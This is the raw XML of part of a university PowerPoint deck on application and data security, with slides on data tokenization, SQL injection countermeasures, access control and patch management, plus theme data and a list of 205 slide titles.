              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Data tokenization is a security method that replaces sensitive data, such as credit card numbers or Social Security numbers, with a non-sensitive placeholder called a "token". The token has no exploitable value on its own but is mapped back to the original sensitive data in a secure vault. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>How it works:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Sensitive data is sent to a secure, centralized tokenization system (vault).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The vault generates a unique, random token.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The token is returned and stored in the database or application in place of the real data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Key Feature: Reversibility</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The process is reversible. Authorized systems can exchange the token for the original value by querying the secure vault.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The token itself </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>has no mathematical relationship </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>to the original data; it is just a random reference.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="314423800"/>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3F0B4-BD46-E08A-F616-7953286AC0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176F2B-F2F8-BE24-763D-78EE4B30799A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FE79E7C4-6A4A-58EC-EF65-BE9A3C4E8A09}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Countermeasures Against SQL Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Use Prepared Statements (Parameterized Queries):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> This is the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>most effective defense</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>. It strictly separates SQL code from user-supplied data, making injection impossible.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Use Stored Procedures:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> (If written correctly without dynamic SQL). They can encapsulate queries and define fixed parameters.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Input Validation &amp; Sanitization:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Validate all user input against a strict "allowlist" of permitted characters. Reject anything that doesn't match.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Principle of Least Privilege:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Configure the database user accounts for web applications with the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>absolute minimum permissions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> needed (e.g., SELECT and INSERT only, no DROP TABLE or GRANT privileges).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1638073292"/>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A69CB-1B6E-27AA-79D2-FFD6E8721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2766C8-155A-2028-C932-B6BEBD8CB884}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0D5F9963-C79C-E0F5-5404-FA4517C529A1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Access Control &amp; Least Privilege:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Implement Granular Access Control:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Enforce strict Role-Based Access Control (RBAC). Ensure users and applications can only access the specific data they need.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Regular Access Reviews:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Periodically review user privileges to ensure they are still required (prevents "privilege creep").</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Patch Management:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Establish a Patch Cycle:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Regularly apply the latest security patches for your Database Management System (DBMS), operating system, and related software to fix known vulnerabilities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Test Patches:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Test all patches in a non-production environment before deploying to live systems to avoid stability issues.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3345831628"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Integers: positive or negative? by Slidesgo">
  <a:themeElements>
    <a:clrScheme name="Simple Light">
      <a:dk1>
        <a:srgbClr val="09264D"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="F6F6F6"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="309985"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="D6E6EB"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="EC687C"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="FFCF06"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="57B8DA"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="FFFFFF"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="FFFFFF"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="FFFFFF"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="09264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2198</TotalTime>
  <Words>19819</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (16:9)</PresentationFormat>
  <Paragraphs>1852</Paragraphs>
  <Slides>205</Slides>
  <Notes>77</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205</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="215" baseType="lpstr">
      <vt:lpstr>Manrope ExtraBold</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Albert Sans</vt:lpstr>
      <vt:lpstr>Symbol</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Nunito Light</vt:lpstr>
      <vt:lpstr>Integers: positive or negative? by Slidesgo</vt:lpstr>
      <vt:lpstr>Custom Design</vt:lpstr>
      <vt:lpstr>BCSE-0601 IT Application &amp; Data Security</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Software development life cycle</vt:lpstr>
      <vt:lpstr>Software development life cycle</vt:lpstr>
      <vt:lpstr>Continued….</vt:lpstr>
      <vt:lpstr>Continued….</vt:lpstr>
      <vt:lpstr>Continued….</vt:lpstr>
      <vt:lpstr>Continued….</vt:lpstr>
      <vt:lpstr>Continued….</vt:lpstr>
      <vt:lpstr>Continued….</vt:lpstr>
      <vt:lpstr>Importance of software development life cycle</vt:lpstr>
      <vt:lpstr>Software development methods</vt:lpstr>
      <vt:lpstr>Waterfall development method</vt:lpstr>
      <vt:lpstr>Waterfall development method</vt:lpstr>
      <vt:lpstr>Risks in Waterfall Model: </vt:lpstr>
      <vt:lpstr>Agile development methodology</vt:lpstr>
      <vt:lpstr>Agile development methodology</vt:lpstr>
      <vt:lpstr>Risks in Agile Development Methodology</vt:lpstr>
      <vt:lpstr>Rapid application development</vt:lpstr>
      <vt:lpstr>Rapid application development</vt:lpstr>
      <vt:lpstr>Attacks on Rapid application development</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Web application security principles</vt:lpstr>
      <vt:lpstr>Application design &amp; development security</vt:lpstr>
      <vt:lpstr>Environment and controls</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Essence of secure software development</vt:lpstr>
      <vt:lpstr>Secure Coding Practices</vt:lpstr>
      <vt:lpstr>Threat Modeling</vt:lpstr>
      <vt:lpstr>SAST (Static Application Security Testing)</vt:lpstr>
      <vt:lpstr>DAST (Dynamic Application Security Testing)</vt:lpstr>
      <vt:lpstr>SAST vs DAST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input validation?</vt:lpstr>
      <vt:lpstr>Types of Input Validation:</vt:lpstr>
      <vt:lpstr>Secure Input Handling</vt:lpstr>
      <vt:lpstr>Continued….</vt:lpstr>
      <vt:lpstr>Regex Pattern</vt:lpstr>
      <vt:lpstr>Input Sanitization</vt:lpstr>
      <vt:lpstr>How Does Input Sanitization Work? </vt:lpstr>
      <vt:lpstr>A Practical Example: Sanitizing a Username</vt:lpstr>
      <vt:lpstr>Encoding</vt:lpstr>
      <vt:lpstr>Canonicalization</vt:lpstr>
      <vt:lpstr>Canonicalization</vt:lpstr>
      <vt:lpstr>Attack Scenario Without Canonicalization</vt:lpstr>
      <vt:lpstr>Answer: b)</vt:lpstr>
      <vt:lpstr>Answer: C)</vt:lpstr>
      <vt:lpstr>Answer: C)</vt:lpstr>
      <vt:lpstr>Answer: b)</vt:lpstr>
      <vt:lpstr>Answer: c)</vt:lpstr>
      <vt:lpstr>Answer: b)</vt:lpstr>
      <vt:lpstr>Parameterized Queries</vt:lpstr>
      <vt:lpstr>Error Handling &amp; Logging</vt:lpstr>
      <vt:lpstr>Risks of Poor Error Handling</vt:lpstr>
      <vt:lpstr>Secure Practices for Error Handling &amp; Logging</vt:lpstr>
      <vt:lpstr>Content Security Policy</vt:lpstr>
      <vt:lpstr>Why CSP is Needed</vt:lpstr>
      <vt:lpstr>Example of CSP in Action</vt:lpstr>
      <vt:lpstr>Sensitive data</vt:lpstr>
      <vt:lpstr>Secure Storage of Sensitive Data</vt:lpstr>
      <vt:lpstr>Sensitive Data Protection,</vt:lpstr>
      <vt:lpstr>Example-1 - attack scenarios</vt:lpstr>
      <vt:lpstr>Example-2 - attack scenarios</vt:lpstr>
      <vt:lpstr>Cross-Site Scripting (XSS</vt:lpstr>
      <vt:lpstr>Stored XSS (Persistent XSS)</vt:lpstr>
      <vt:lpstr>Reflected XSS (Non-Persistent XSS) </vt:lpstr>
      <vt:lpstr>DOM-Based XSS</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Buffer Overflow</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Path Traversal</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Command Injection</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Data Tampering</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Answer: b)</vt:lpstr>
      <vt:lpstr>Answer: c)</vt:lpstr>
      <vt:lpstr>Answer: b)</vt:lpstr>
      <vt:lpstr>Answer: b)</vt:lpstr>
      <vt:lpstr>Answer: d)</vt:lpstr>
      <vt:lpstr>Answer: c)</vt:lpstr>
      <vt:lpstr>Answer: c)</vt:lpstr>
      <vt:lpstr>Answer: d)</vt:lpstr>
      <vt:lpstr>Answer: d)</vt:lpstr>
      <vt:lpstr>Answer: b)</vt:lpstr>
      <vt:lpstr>Answer: d)</vt:lpstr>
      <vt:lpstr>Answer: c)</vt:lpstr>
      <vt:lpstr>Answer: d)</vt:lpstr>
      <vt:lpstr>Answer: a)</vt:lpstr>
      <vt:lpstr>Answer: c)</vt:lpstr>
      <vt:lpstr>User Authentication </vt:lpstr>
      <vt:lpstr>Types of Authentication</vt:lpstr>
      <vt:lpstr>Brute Force</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Dictionary Attack</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Credential Theft</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Phishing Attack</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Elevation of Privilege</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Cookie Replay</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Luring Attack</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>User Authentication </vt:lpstr>
      <vt:lpstr>Types of Authentication</vt:lpstr>
      <vt:lpstr>Brute Force</vt:lpstr>
      <vt:lpstr>Example of a Brute Force Attack in Python </vt:lpstr>
      <vt:lpstr>Tools Used for Brute Force Attacks </vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Dictionary Attack</vt:lpstr>
      <vt:lpstr>Types of Dictionary Attacks </vt:lpstr>
      <vt:lpstr>Real-World Examples </vt:lpstr>
      <vt:lpstr>Dictionary Attack Example in Python </vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Credential Theft</vt:lpstr>
      <vt:lpstr>How Credential Theft Attacks Work </vt:lpstr>
      <vt:lpstr>Types of Credential Theft Attacks </vt:lpstr>
      <vt:lpstr>Tools Used in Credential Theft Attacks </vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Phishing Attack</vt:lpstr>
      <vt:lpstr>Types of Phishing Attacks</vt:lpstr>
      <vt:lpstr>Types of Phishing Attacks</vt:lpstr>
      <vt:lpstr>Examples of Phishing URL Attacks</vt:lpstr>
      <vt:lpstr>Examples of Phishing URL Attacks</vt:lpstr>
      <vt:lpstr>How to Identify a Phishing Attempt: A Practical Guide </vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Elevation of Privilege</vt:lpstr>
      <vt:lpstr>Types of Elevation of Privilege</vt:lpstr>
      <vt:lpstr>Vertical Privilege Escalation </vt:lpstr>
      <vt:lpstr>Horizontal Privilege Escalation </vt:lpstr>
      <vt:lpstr>Diagonal Privilege Escalation</vt:lpstr>
      <vt:lpstr>Impact of Elevation of Privilege</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Cookie Replay</vt:lpstr>
      <vt:lpstr>A successful attack follows a simple pattern:</vt:lpstr>
      <vt:lpstr>Types of Cookie Replay Attacks</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Luring Attack</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Session Management </vt:lpstr>
      <vt:lpstr>Security Headers </vt:lpstr>
      <vt:lpstr>Security Headers </vt:lpstr>
      <vt:lpstr>Examples: First-Party vs. Cross-Site Requests </vt:lpstr>
      <vt:lpstr>Cookies </vt:lpstr>
      <vt:lpstr>Cross-Site Request Forgery (CSRF) </vt:lpstr>
      <vt:lpstr>CSRF</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Session Hijacking </vt:lpstr>
      <vt:lpstr>Session Fixation </vt:lpstr>
      <vt:lpstr>Session Fixation</vt:lpstr>
      <vt:lpstr>Network Eavesdropping</vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Introduction to Databases</vt:lpstr>
      <vt:lpstr>Database Security </vt:lpstr>
      <vt:lpstr>Principles of Database Security</vt:lpstr>
      <vt:lpstr>SQL Injection</vt:lpstr>
      <vt:lpstr>In-Band SQL Injection </vt:lpstr>
      <vt:lpstr>In-Band SQL Injection - Error-based SQLi</vt:lpstr>
      <vt:lpstr>In-Band SQL Injection - Union-based SQLi</vt:lpstr>
      <vt:lpstr>Blind SQLi — Boolean-based</vt:lpstr>
      <vt:lpstr>Blind SQLi — Time-based  </vt:lpstr>
      <vt:lpstr>Out-of-band SQL injection </vt:lpstr>
      <vt:lpstr>SQL Injection — Countermeasures</vt:lpstr>
      <vt:lpstr>Database Auditing</vt:lpstr>
      <vt:lpstr>Database Auditing</vt:lpstr>
      <vt:lpstr>Database Monitoring </vt:lpstr>
      <vt:lpstr>Database Monitoring </vt:lpstr>
      <vt:lpstr>Activity Logs </vt:lpstr>
      <vt:lpstr>Activity Logs </vt:lpstr>
      <vt:lpstr>Anomaly Detection</vt:lpstr>
      <vt:lpstr>Backup and Recovery Strategies </vt:lpstr>
      <vt:lpstr>Types of Backup </vt:lpstr>
      <vt:lpstr>Disaster Recovery Plans (DRP)</vt:lpstr>
      <vt:lpstr>Importance of Disaster Recovery Plans in Organizational Security</vt:lpstr>
      <vt:lpstr>Key Strategies for Business Continuity After Failures</vt:lpstr>
      <vt:lpstr>Access Control Mechanisms</vt:lpstr>
      <vt:lpstr>Principles of Effective Access Control </vt:lpstr>
      <vt:lpstr>Granular Access Control</vt:lpstr>
      <vt:lpstr>Key Levels of Granularity </vt:lpstr>
      <vt:lpstr>Benefits of Granular Access Control</vt:lpstr>
      <vt:lpstr>Least Privilege Principle</vt:lpstr>
      <vt:lpstr>Implementation Strategies </vt:lpstr>
      <vt:lpstr>Patch Management</vt:lpstr>
      <vt:lpstr>Data Masking </vt:lpstr>
      <vt:lpstr>Data Tokenization </vt:lpstr>
      <vt:lpstr>Countermeasures</vt:lpstr>
      <vt:lpstr>Countermeasures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Arvind</dc:creator>
  <cp:lastModifiedBy>Arvind Prasad</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-09-24T01:51:19Z</dcterms:modified>
</cp:coreProperties>
</file>